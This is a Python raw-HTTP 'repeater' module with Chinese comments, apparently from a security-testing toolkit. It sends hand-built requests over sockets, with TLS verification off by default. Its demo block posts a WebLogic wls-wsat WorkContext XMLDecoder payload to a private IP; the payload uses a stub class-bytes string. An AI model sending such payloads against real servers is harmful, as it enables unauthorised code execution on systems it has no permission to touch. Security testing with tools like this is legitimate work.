import gzip
import socket
import ssl
import zlib
import brotli
from dataclasses import dataclass
from typing import Dict, Optional, Tuple, Union, List
import os

module_name = os.path.splitext(os.path.basename(__file__))[0]


def debug_log(msg: str, tag: str = "") -> None:
    if os.environ.get("EXP_DEBUG", "false") == "true":
        log = f"[{module_name}][{tag}] {msg}" if tag else f"[{module_name}] {msg}"
        print(log)


@dataclass
class RawResponse:
    """原始HTTP响应结构"""

    ok: bool
    error: str
    resp: bytes

    def __bool__(self) -> bool:
        return self.ok

    def text(self, encoding: str = "utf-8", errors: str = "replace") -> str:
        debug_log(f"解码响应文本，编码: {encoding}, 大小: {len(self.resp)} 字节", "RawResponse.text")
        return self.resp.decode(encoding, errors=errors)

    def status_line(self) -> str:
        if not self.ok:
            debug_log("响应状态为 False，返回空字符串", "RawResponse.status_line")
            return ""
        try:
            first_line = self.resp.split(b"\r\n")[0]
            status = first_line.decode("utf-8", errors="replace")
            debug_log(f"状态行: {status}", "RawResponse.status_line")
            return status
        except Exception as e:
            debug_log(f"解析状态行失败: {e}", "RawResponse.status_line")
            return ""

    def headers(self) -> Dict[str, List[str]]:
        """
        返回解析后的响应头字典。
        key 已统一小写，值为列表（多值头如 set-cookie 长度 >= 1）。
        响应不合法或解析失败时返回空字典。
        """
        if not self.resp:
            debug_log("响应为空，返回空字典", "RawResponse.headers")
            return {}
        parsed, _ = _parse_headers(self.resp)
        debug_log(f"解析到 {len(parsed)} 个响应头字段", "RawResponse.headers")
        return parsed

    def body(self) -> bytes:
        """
        返回原始响应体字节。
        已由 send_raw_request 完成 chunked 解码与 Content-Encoding 解压，
        此处只做 header/body 分割。
        """
        if not self.resp:
            debug_log("响应为空，返回空 body", "RawResponse.body")
            return b""
        _, body_part = _parse_headers(self.resp)
        debug_log(f"响应 body 大小: {len(body_part)} 字节", "RawResponse.body")
        return body_part

    def body_text(self, encoding: str = "utf-8", errors: str = "replace") -> str:
        """
        返回解码后的响应体字符串。
        encoding 默认 utf-8；若响应头中 Content-Type 携带 charset，
        可手动传入对应编码。
        """
        body = self.body()
        debug_log(f"解码 body 文本，编码: {encoding}, 大小: {len(body)} 字节", "RawResponse.body_text")
        return body.decode(encoding, errors=errors)

    def build_cookie(self, old_cookie: str = "") -> Optional[str]:
        """
        从响应的 Set-Cookie 头构造 Cookie 请求头字符串。
        若提供 old_cookie，则以其为基础合并新 cookie，新值覆盖同名旧值。

        返回格式：`name1=value1;name2=value2`
        若响应中不含 Set-Cookie 头且 old_cookie 为空则返回 None。
        """
        debug_log(f"开始构建 Cookie，old_cookie: {old_cookie[:50] if old_cookie else 'None'}...",
                  "RawResponse.build_cookie")
        set_cookies: List[str] = self.headers().get("set-cookie", [])
        debug_log(f"从响应获取到 {len(set_cookies)} 个 Set-Cookie 头", "RawResponse.build_cookie")

        # 解析 old_cookie 为有序字典
        merged: Dict[str, str] = {}
        if old_cookie:
            for pair in old_cookie.split(";"):
                pair = pair.strip()
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    merged[k.strip()] = v.strip()
                elif pair:
                    merged[pair] = ""

        if not set_cookies and not merged:
            debug_log("无 Set-Cookie 且无旧 Cookie，返回 None", "RawResponse.build_cookie")
            return None

        # 用新 Set-Cookie 覆盖同名旧值
        for cookie in set_cookies:
            name_value = cookie.split(";", 1)[0].strip()
            if "=" in name_value:
                k, v = name_value.split("=", 1)
                merged[k.strip()] = v.strip()
            elif name_value:
                merged[name_value] = ""

        if not merged:
            debug_log("合并后 Cookie 为空，返回 None", "RawResponse.build_cookie")
            return None

        result = ";".join(
            f"{k}={v}" if v else k
            for k, v in merged.items()
        )
        debug_log(f"构建的 Cookie: {result[:100]}...", "RawResponse.build_cookie")
        return result


def _extract_host_and_port(raw: bytes) -> Optional[Tuple[str, Optional[int]]]:
    try:
        lower = raw.lower()
        key = b"\r\nhost:"
        idx = lower.find(key)
        if idx == -1:
            debug_log("未找到 Host 头", "_extract_host_and_port")
            return None

        start = idx + len(key)
        end = lower.find(b"\r\n", start)
        if end == -1:
            end = len(raw)

        host_value = raw[start:end].strip().decode()

        if host_value.startswith("["):
            bracket_end = host_value.find("]")
            if bracket_end != -1:
                host = host_value[1:bracket_end]
                port_part = host_value[bracket_end + 1:]
                if port_part.startswith(":"):
                    try:
                        port = int(port_part[1:])
                        debug_log(f"IPv6 地址: host={host}, port={port}", "_extract_host_and_port")
                        return host, port
                    except ValueError:
                        pass
                debug_log(f"IPv6 地址: host={host}, 无端口", "_extract_host_and_port")
                return host, None

        if ":" in host_value:
            parts = host_value.rsplit(":", 1)
            try:
                result = parts[0], int(parts[1])
                debug_log(f"提取结果: host={result[0]}, port={result[1]}", "_extract_host_and_port")
                return result
            except (ValueError, IndexError):
                pass

        debug_log(f"提取结果: host={host_value}, 无端口", "_extract_host_and_port")
        return host_value, None
    except Exception as e:
        debug_log(f"提取 Host 异常: {e}", "_extract_host_and_port")
        return None


def _parse_headers(header_bytes: bytes) -> Tuple[Dict[str, List[str]], bytes]:
    """
    解析 HTTP 响应头

    返回:
        headers: Dict[str, List[str]]
            所有头字段统一以列表存储；
            单值头列表长度为 1，多值头（如 set-cookie）列表长度 >= 1。
        body_part: bytes
    """
    debug_log(f"开始解析响应头，数据大小: {len(header_bytes)} 字节", "_parse_headers")
    headers: Dict[str, List[str]] = {}

    header_separator = b"\r\n\r\n"
    separator_index = header_bytes.find(header_separator)

    if separator_index == -1:
        header_part = header_bytes
        body_part = b""
        debug_log("未找到头部分隔符", "_parse_headers")
    else:
        header_part = header_bytes[:separator_index]
        body_part = header_bytes[separator_index + len(header_separator):]
        debug_log(f"头部大小: {len(header_part)}, body 大小: {len(body_part)}", "_parse_headers")

    lines = header_part.split(b"\r\n")

    for line in lines[1:]:
        if b":" not in line:
            continue

        key, value = line.split(b":", 1)
        key = key.decode("latin-1").strip().lower()
        value = value.decode("latin-1").strip()

        if key in headers:
            headers[key].append(value)
        else:
            headers[key] = [value]

    debug_log(f"解析完成，共 {len(headers)} 个头字段", "_parse_headers")
    return headers, body_part


def _decode_chunked(data: bytes) -> Tuple[bytes, str]:
    debug_log(f"开始 chunked 解码，数据大小: {len(data)} 字节", "_decode_chunked")
    result = bytearray()
    pos = 0
    chunk_count = 0

    while pos < len(data):
        line_end = data.find(b"\r\n", pos)
        if line_end == -1:
            error = "Truncated chunk: missing CRLF after chunk size"
            debug_log(f"解码失败: {error}", "_decode_chunked")
            return bytes(result), error

        size_line = data[pos:line_end]
        semicolon = size_line.find(b";")
        if semicolon != -1:
            size_line = size_line[:semicolon]

        try:
            chunk_size = int(size_line.strip(), 16)
        except ValueError:
            error = f"Invalid chunk size: {data[pos:line_end]!r}"
            debug_log(f"解码失败: {error}", "_decode_chunked")
            return bytes(result), error

        if chunk_size == 0:
            debug_log(f"chunked 解码完成，共 {chunk_count} 个块，总大小: {len(result)} 字节", "_decode_chunked")
            break

        data_start = line_end + 2
        data_end = data_start + chunk_size

        if data_end > len(data):
            result += data[data_start:]
            error = f"Truncated chunk: expected {chunk_size} bytes, got {len(data) - data_start}"
            debug_log(f"解码失败: {error}", "_decode_chunked")
            return bytes(result), error

        result += data[data_start:data_end]
        chunk_count += 1
        pos = data_end + 2

    return bytes(result), ""


def _decode_content_encoding(body: bytes, content_encoding: str) -> Tuple[bytes, str]:
    encoding = content_encoding.lower().strip()
    debug_log(f"开始解压缩，编码: {encoding}, 数据大小: {len(body)} 字节", "_decode_content_encoding")

    if not encoding or encoding == "identity":
        debug_log("无需解压缩", "_decode_content_encoding")
        return body, ""

    if encoding == "gzip":
        try:
            decompressed = gzip.decompress(body)
            debug_log(f"gzip 解压成功，解压后大小: {len(decompressed)} 字节", "_decode_content_encoding")
            return decompressed, ""
        except Exception as e:
            error = f"gzip decompress failed: {e}"
            debug_log(f"解压失败: {error}", "_decode_content_encoding")
            return body, error

    if encoding == "deflate":
        try:
            decompressed = zlib.decompress(body)
            debug_log(f"deflate 解压成功，解压后大小: {len(decompressed)} 字节", "_decode_content_encoding")
            return decompressed, ""
        except zlib.error:
            try:
                decompressed = zlib.decompress(body, wbits=-zlib.MAX_WBITS)
                debug_log(f"deflate (raw) 解压成功，解压后大小: {len(decompressed)} 字节", "_decode_content_encoding")
                return decompressed, ""
            except Exception as e:
                error = f"deflate decompress failed: {e}"
                debug_log(f"解压失败: {error}", "_decode_content_encoding")
                return body, error

    if encoding == "br":
        try:
            decompressed = brotli.decompress(body)
            debug_log(f"brotli 解压成功，解压后大小: {len(decompressed)} 字节", "_decode_content_encoding")
            return decompressed, ""
        except Exception as e:
            error = f"brotli decompress failed: {e}"
            debug_log(f"解压失败: {error}", "_decode_content_encoding")
            return body, error

    error = f"Unknown Content-Encoding '{encoding}', returned raw body"
    debug_log(f"警告: {error}", "_decode_content_encoding")
    return body, error


def _get_header(headers: Dict[str, List[str]], key: str) -> Optional[str]:
    """取单值头的首个值，不存在时返回 None。"""
    values = headers.get(key)
    return values[0] if values else None


def _get_header_joined(headers: Dict[str, List[str]], key: str, sep: str = ", ") -> str:
    """将同名头的所有值用 sep 拼接后返回，不存在时返回空字符串。"""
    values = headers.get(key)
    return sep.join(values) if values else ""


def send_raw_request(
        raw_request: bytes,
        port: Optional[int] = None,
        host: Optional[str] = None,
        use_ssl: bool = False,
        verify_ssl: bool = False,
        timeout: int = 8,
        max_response_size: int = 3 * 1024 * 1024,
) -> RawResponse:
    """
    发送原始HTTP请求并接收响应
    """
    conn = None

    try:
        if port is None or not host:
            debug_log("从请求头中提取 Host 和端口", "send_raw_request")
            host_port = _extract_host_and_port(raw_request)
            if not host_port:
                debug_log("提取 Host 失败", "send_raw_request")
                return RawResponse(
                    ok=False, error="Host header not found in request", resp=b""
                )
            if port is None and not host_port[1]:
                port = 443 if use_ssl else 80
                debug_log(f"使用默认端口: {port}", "send_raw_request")
            elif port is None:
                port = host_port[1]

            if not host and not host_port[0]:
                debug_log("Host 头错误", "send_raw_request")
                return RawResponse(ok=False, error="Host header error", resp=b"")
            elif not host:
                host = host_port[0]

        try:
            sock = socket.create_connection((host, port), timeout=timeout)
            debug_log(f"连接目标: {host}:{port} 成功", "send_raw_request")
        except socket.timeout:
            debug_log(f"连接目标: {host}:{port} 超时", "send_raw_request")
            return RawResponse(
                ok=False, error=f"Connection timeout to {host}:{port}", resp=b""
            )
        except socket.gaierror as e:
            debug_log(f"DNS 解析失败: {e}", "send_raw_request")
            return RawResponse(
                ok=False, error=f"DNS resolution failed for {host}: {str(e)}", resp=b""
            )
        except ConnectionRefusedError:
            debug_log(f"连接被拒绝", "send_raw_request")
            return RawResponse(
                ok=False, error=f"Connection refused to {host}:{port}", resp=b""
            )
        except OSError as e:
            debug_log(f"网络错误: {e}", "send_raw_request")
            return RawResponse(ok=False, error=f"Network error: {str(e)}", resp=b"")

        if use_ssl:
            debug_log(f"开始 SSL 握手，verify_ssl={verify_ssl}", "send_raw_request")
            try:
                context = ssl.create_default_context()
                if not verify_ssl:
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                conn = context.wrap_socket(sock, server_hostname=host)
                debug_log("SSL 握手成功", "send_raw_request")
            except ssl.SSLError as e:
                sock.close()
                debug_log(f"SSL 错误: {e}", "send_raw_request")
                return RawResponse(ok=False, error=f"SSL error: {str(e)}", resp=b"")
            except Exception as e:
                sock.close()
                debug_log(f"SSL 握手失败: {e}", "send_raw_request")
                return RawResponse(
                    ok=False, error=f"SSL handshake failed: {str(e)}", resp=b""
                )
        else:
            conn = sock

        try:
            conn.settimeout(timeout)
            debug_log(f"发送请求，大小: {len(raw_request)} 字节", "send_raw_request")
            debug_log(f"发送请求，内容: {raw_request}", "send_raw_request")
            conn.sendall(raw_request)
        except socket.timeout:
            debug_log("发送超时", "send_raw_request")
            return RawResponse(ok=False, error="Send timeout", resp=b"")
        except Exception as e:
            debug_log(f"发送失败: {e}", "send_raw_request")
            return RawResponse(ok=False, error=f"Send failed: {str(e)}", resp=b"")

        header_buf = bytearray()
        header_separator = b"\r\n\r\n"

        debug_log("开始接收响应头", "send_raw_request")
        try:
            while header_separator not in header_buf:
                chunk = conn.recv(1024 * 64)
                if not chunk:
                    debug_log("连接关闭", "send_raw_request")
                    break
                header_buf += chunk

                if len(header_buf) > max_response_size:
                    debug_log(f"响应头过大: {len(header_buf)} 字节", "send_raw_request")
                    return RawResponse(
                        ok=False,
                        error="Response headers too large or invalid",
                        resp=bytes(header_buf),
                    )
        except socket.timeout:
            if not header_buf:
                debug_log("接收响应头超时", "send_raw_request")
                return RawResponse(
                    ok=False,
                    error="Timeout while waiting for response headers",
                    resp=b"",
                )

        header_buf = bytes(header_buf)
        debug_log(f"接收到响应头，大小: {len(header_buf)} 字节", "send_raw_request")
        body_start = b""

        if header_separator in header_buf:
            sep_idx = header_buf.find(header_separator)
            body_start = header_buf[sep_idx + len(header_separator):]
            header_data = header_buf[: sep_idx + len(header_separator)]
            debug_log(f"分离头部和 body，body 起始大小: {len(body_start)} 字节", "send_raw_request")
        else:
            header_data = header_buf

        headers, _ = _parse_headers(header_data)

        # Content-Length：取首个值
        content_length: Optional[int] = None
        content_length_str = _get_header(headers, "content-length")
        if content_length_str is not None:
            try:
                cl = int(content_length_str)
                content_length = cl if cl >= 0 else None
                debug_log(f"Content-Length: {content_length}", "send_raw_request")
            except ValueError:
                debug_log("Content-Length 解析失败", "send_raw_request")
                content_length = None

        response_parts = [header_data, body_start]
        total_received = len(header_data) + len(body_start)

        if content_length is not None:
            body_length_to_read = content_length - len(body_start)
            debug_log(f"根据 Content-Length 接收 body，还需接收: {body_length_to_read} 字节", "send_raw_request")

            while body_length_to_read > 0:
                if total_received > max_response_size:
                    debug_log(f"响应超过最大限制: {total_received} 字节", "send_raw_request")
                    return RawResponse(
                        ok=False,
                        error=f"Response exceeded maximum size limit of {max_response_size} bytes",
                        resp=b"".join(response_parts),
                    )
                try:
                    chunk = conn.recv(min(body_length_to_read, 65536))
                    if not chunk:
                        debug_log("连接提前关闭", "send_raw_request")
                        break
                    response_parts.append(chunk)
                    body_length_to_read -= len(chunk)
                    total_received += len(chunk)
                except socket.timeout:
                    debug_log("接收 body 超时", "send_raw_request")
                    return RawResponse(
                        ok=False,
                        error="Timeout while receiving response body (Content-Length specified)",
                        resp=b"".join(response_parts),
                    )
                except Exception as e:
                    debug_log(f"接收错误: {e}", "send_raw_request")
                    return RawResponse(
                        ok=False,
                        error=f"Receive error: {str(e)}",
                        resp=b"".join(response_parts),
                    )
        else:
            debug_log("无 Content-Length，持续接收直到连接关闭", "send_raw_request")
            while True:
                if total_received > max_response_size:
                    debug_log(f"响应超过最大限制: {total_received} 字节", "send_raw_request")
                    return RawResponse(
                        ok=False,
                        error=f"Response exceeded maximum size limit of {max_response_size} bytes",
                        resp=b"".join(response_parts),
                    )
                try:
                    chunk = conn.recv(65536)
                    if not chunk:
                        debug_log("连接关闭，接收完成", "send_raw_request")
                        break
                    response_parts.append(chunk)
                    total_received += len(chunk)
                except socket.timeout:
                    debug_log("接收超时，视为接收完成", "send_raw_request")
                    break
                except Exception as e:
                    debug_log(f"接收错误: {e}", "send_raw_request")
                    return RawResponse(
                        ok=False,
                        error=f"Receive error: {str(e)}",
                        resp=b"".join(response_parts),
                    )

        response_data = b"".join(response_parts)
        debug_log(f"接收完成，总大小: {len(response_data)} 字节", "send_raw_request")

        if not response_data:
            debug_log("未接收到响应", "send_raw_request")
            return RawResponse(
                ok=False, error="No response received from server", resp=b""
            )

        # Transfer-Encoding：拼接所有值后检查是否含 chunked
        transfer_encoding = _get_header_joined(headers, "transfer-encoding")
        if "chunked" in transfer_encoding.lower():
            debug_log("检测到 chunked 编码，开始解码", "send_raw_request")
            _, raw_body = _parse_headers(response_data)
            decoded_body, chunk_err = _decode_chunked(raw_body)
            if chunk_err:
                debug_log(f"chunked 解码错误: {chunk_err}", "send_raw_request")
                return RawResponse(
                    ok=False,
                    error=f"Chunked decode error: {chunk_err}",
                    resp=header_data + decoded_body,
                )
            response_data = header_data + decoded_body

        # Content-Encoding：取首个值
        content_encoding = _get_header(headers, "content-encoding") or ""
        if content_encoding:
            debug_log(f"检测到 Content-Encoding: {content_encoding}", "send_raw_request")
            _, body_to_decompress = _parse_headers(response_data)
            decompressed, enc_err = _decode_content_encoding(
                body_to_decompress, content_encoding
            )
            if enc_err:
                debug_log(f"Content-Encoding 解码错误: {enc_err}", "send_raw_request")
                return RawResponse(
                    ok=False,
                    error=f"Content-Encoding decode error: {enc_err}",
                    resp=response_data,
                )
            response_data = header_data + decompressed

        debug_log(f"请求成功，最终响应大小: {len(response_data)} 字节", "send_raw_request")
        debug_log(f"请求成功，最终响应内容: {response_data[:400]}...", "send_raw_request")
        return RawResponse(ok=True, error="", resp=response_data)

    except Exception as e:
        debug_log(f"未预期的异常: {e}", "send_raw_request")
        return RawResponse(ok=False, error=f"Unexpected error: {str(e)}", resp=b"")

    finally:
        if conn:
            try:
                conn.close()
                debug_log("连接已关闭", "send_raw_request")
            except Exception:
                pass


def _fix_content_length(raw: bytes) -> bytes:
    debug_log(f"修正 Content-Length，请求大小: {len(raw)} 字节", "_fix_content_length")
    separator = b"\r\n\r\n"
    sep_idx = raw.find(separator)

    if sep_idx == -1:
        debug_log("未找到头部分隔符，不修正", "_fix_content_length")
        return raw

    header_part = raw[:sep_idx]
    body_part = raw[sep_idx + len(separator):]
    body_len = len(body_part)
    debug_log(f"body 大小: {body_len} 字节", "_fix_content_length")

    lines = header_part.split(b"\r\n")
    filtered = [
        line for line in lines if not line.lower().startswith(b"content-length")
    ]

    if body_len > 0:
        filtered.append(f"Content-Length: {body_len}".encode())
        debug_log(f"添加 Content-Length: {body_len}", "_fix_content_length")

    new_header = b"\r\n".join(filtered)
    return new_header + separator + body_part


def _insert_headers(raw_request: bytes, headers: Dict[str, Union[str, bytes]]) -> bytes:
    """
    向原始 HTTP 请求中插入或覆盖头字段。
    """
    debug_log(f"插入/覆盖 {len(headers)} 个头字段", "_insert_headers")
    separator = b"\r\n\r\n"
    sep_idx = raw_request.find(separator)

    if sep_idx == -1:
        header_part = raw_request
        body_part = b""
    else:
        header_part = raw_request[:sep_idx]
        body_part = raw_request[sep_idx:]  # 保留 \r\n\r\n + body

    lines = header_part.split(b"\r\n")
    request_line = lines[0]
    header_lines = lines[1:]

    # 构建待插入的规范化映射：lower_key -> (原始key bytes, 值 bytes)
    pending: Dict[bytes, Tuple[bytes, bytes]] = {}
    for k, v in headers.items():
        k_bytes = k.encode("latin-1") if isinstance(k, str) else k
        v_bytes = v.encode("latin-1") if isinstance(v, str) else v
        assert isinstance(k_bytes, bytes)
        assert isinstance(v_bytes, bytes)
        pending[k_bytes.lower()] = (k_bytes, v_bytes)

    # 遍历已有头，替换命中的
    new_header_lines: List[bytes] = []
    replaced: set[bytes] = set()

    for line in header_lines:
        if b":" not in line:
            new_header_lines.append(line)
            continue

        field_name, _ = line.split(b":", 1)
        lower_name = field_name.strip().lower()

        if lower_name in pending:
            k_bytes, v_bytes = pending[lower_name]
            new_header_lines.append(k_bytes + b": " + v_bytes)
            replaced.add(lower_name)
        else:
            new_header_lines.append(line)

    # 追加未命中的新头
    for lower_key, (k_bytes, v_bytes) in pending.items():
        if lower_key not in replaced:
            new_header_lines.append(k_bytes + b": " + v_bytes)

    result = b"\r\n".join([request_line] + new_header_lines) + body_part
    debug_log(f"头字段处理完成，新请求大小: {len(result)} 字节", "_insert_headers")
    return result


def repeater(
        raw_request: Union[str, bytes],
        port: Optional[int] = None,
        host: Optional[str] = None,
        use_ssl: bool = False,
        verify_ssl: bool = False,
        timeout: int = 8,
        max_response_size: int = 3 * 1024 * 1024,
        fix_content_length: bool = True,
        headers: Optional[Dict[str, Union[str, bytes]]] = None
) -> RawResponse:
    debug_log(f"repeater 开始，host={host}, port={port}, ssl={use_ssl}, fix_content_length={fix_content_length}",
              "repeater")

    if isinstance(raw_request, str):
        raw_request = raw_request.replace("\r\n", "\n").replace("\r", "\n")
        assert isinstance(raw_request, str)
        raw_request = raw_request.replace("\n", "\r\n").encode("utf-8")

    if headers is None:
        headers = {}
    assert isinstance(headers, dict)
    if headers.get("Connection") is None:
        headers["Connection"] = "close"
        debug_log("添加默认头 Connection: close", "repeater")

    assert isinstance(raw_request, bytes)
    raw_request = _insert_headers(raw_request, headers)

    assert isinstance(raw_request, bytes)
    if fix_content_length:
        raw_request = _fix_content_length(raw_request)

    assert isinstance(raw_request, bytes)
    return send_raw_request(
        raw_request=raw_request,
        port=port,
        host=host,
        use_ssl=use_ssl,
        verify_ssl=verify_ssl,
        timeout=timeout,
        max_response_size=max_response_size,
    )


if __name__ == "__main__":
    http_request_local = """POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.192.148:28689
Content-Type: text/xml;charset=UTF-8
Content-Length: 5367
User-Agent: Mozilla/5.0
Connection: close

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java>
                <void class="weblogic.utils.Hex" method="fromHexString" id="cls">
                    <string>0xcafebabe</string>
                </void>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>
"""
    response_local = repeater(http_request_local)
    if response_local.ok:
        print(f"✓ 成功, 响应大小: {len(response_local.resp)} 字节")
        print(f"状态行: {response_local.status_line()}")
        print(f"\n响应预览:\n{response_local.text()}")
    else:
        print(f"✗ 失败: {response_local.error}")